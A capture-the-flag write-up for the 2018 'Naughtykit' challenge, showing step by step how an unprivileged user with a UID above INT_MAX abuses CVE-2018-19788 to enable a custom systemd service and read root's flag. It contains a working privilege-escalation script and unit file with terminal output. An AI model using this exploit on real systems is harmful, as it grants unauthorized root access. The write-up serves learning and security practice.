# Naughtykit - Pwn/misc (100)

O'boy, o'boy was this kit naughty this year or what. There's no present for
him for sure! But .. what if he's too naughty?

Service: ssh -p 1217 [email protected] (password: naughtykit)

## Analysis

This should have been more obvious than it was for me, but I wasn't as
familiar with recent CVEs as I needed to be. Some initial analysis of the box
gives us a high UID value and a Debian OS.

```  
$ ssh -p 1217 [email protected]  
[email protected]'s password:  
Linux version 4.9.18-otw (root@vblx03) (gcc version 6.3.0 20170516 (Debian
6.3.0-18+deb9u1) ) #15 Fri Dec 7 16:31:26 CET 2018  
...  
Welcome to Debian GNU/Linux 9 (stretch)!

...

                 _  
               _[_]_  
                (")  
            `--( : )--'  
              (  :  )  
        jgs ""`-...-'""

username: elf  
password: elf

You've been a naughty kit, ho-ho-hoo!

northpole login: elf (automatic login)

Linux northpole 4.9.18-otw #15 Fri Dec 7 16:31:26 CET 2018 x86_64  
elf@northpole:~$  
elf@northpole:~$ cat /etc/os-release  
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"  
NAME="Debian GNU/Linux"  
VERSION_ID="9"  
VERSION="9 (stretch)"  
ID=debian  
HOME_URL="https://www.debian.org/"  
SUPPORT_URL="https://www.debian.org/support"  
BUG_REPORT_URL="https://bugs.debian.org/"  
elf@northpole:~$ id  
uid=4020181224(elf) gid=100(users) groups=100(users)  
```

Some hints after the competition pointed me to the following links:

* [gitlab: unprivileged users with UID > INT_MAX can successfully execute any systemctl command](https://gitlab.freedesktop.org/polkit/polkit/issues/74)  
* [github: unprivileged users with UID > INT_MAX can successfully execute any systemctl command](https://github.com/systemd/systemd/issues/11026)  
* [CVE-2018-19788 Detail](https://nvd.nist.gov/vuln/detail/CVE-2018-19788)  
* [github: Silly easy exploit for CVE-2018-19788](https://github.com/AbsoZed/CVE-2018-19788)

Enough experimenting shows that the 'elf' user we start with can indeed run
`systemctl` commands which we should probably use to privesc and read whatever
is in `/root/`

## Solution

Login and copy/paste the following:

```bash  
cat <<EOF > /home/elf/pwn.sh  
#!/bin/sh

ls -al /root/ > /home/elf/root_dir  
cat /root/flag > /home/elf/flag  
EOF

chmod 777 /home/elf/pwn.sh

cat <<EOF > /home/elf/pwn.service  
[Unit]  
Description=pwn  
After=network.target  
  
[Service]  
ExecStart=/home/elf/pwn.sh  
ExecReload=/home/elf/pwn.sh  
Restart=on-failure  
RuntimeDirectoryMode=0755  
  
[Install]  
WantedBy=multi-user.target  
Alias=pwn.service  
EOF

systemctl enable /home/elf/pwn.service  
systemctl start pwn.service

cat flag  
```

This eventually gets you the following:

```bash  
...  
elf@northpole:~$ systemctl enable /home/elf/pwn.service

(process:162): GLib-GObject-WARNING **: value "-274786072" of type 'gint' is
invalid or out of range for property 'uid' of type 'gint'  
**  
ERROR:pkttyagent.c:175:main: assertion failed: (polkit_unix_process_get_uid
(POLKIT_UNIX_PROCESS (subject)) >= 0)  
Created symlink /etc/systemd/system/pwn.service → /home/elf/pwn.service.  
Created symlink /etc/systemd/system/multi-user.target.wants/pwn.service →
/home/elf/pwn.service.  
elf@northpole:~$ systemctl start pwn.service

(process:179): GLib-GObject-WARNING **: value "-274786072" of type 'gint' is
invalid or out of range for property 'uid' of type 'gint'  
**  
ERROR:pkttyagent.c:175:main: assertion failed: (polkit_unix_process_get_uid
(POLKIT_UNIX_PROCESS (subject)) >= 0)  
elf@northpole:~$ ll  
total 12  
drwx------ 2 elf  users 1024 Dec 28 05:21 .  
drwxr-xr-x 3 root root  1024 Dec  6 23:48 ..  
lrwxrwxrwx 1 root root     9 Dec  7 00:54 .bash_history -> /dev/null  
-rw-r--r-- 1 elf  users  220 May 15  2017 .bash_logout  
-rw-r--r-- 1 elf  users 3526 May 15  2017 .bashrc  
-rw-r--r-- 1 elf  users  675 May 15  2017 .profile  
-rw-r--r-- 1 root root    29 Dec 28 05:21 flag  
-rw-r--r-- 1 elf  users  213 Dec 28 05:21 pwn.service  
-rwxrwxrwx 1 elf  users   78 Dec 28 05:21 pwn.sh  
-rw-r--r-- 1 root root   266 Dec 28 05:21 root_dir  
elf@northpole:~$ cat flag  
AOTW{INtEgerzRhARds0mETIm35}  
```

Original writeup
(https://github.com/nononovak/otwadvent2018-ctfwriteup/blob/master/day17.md).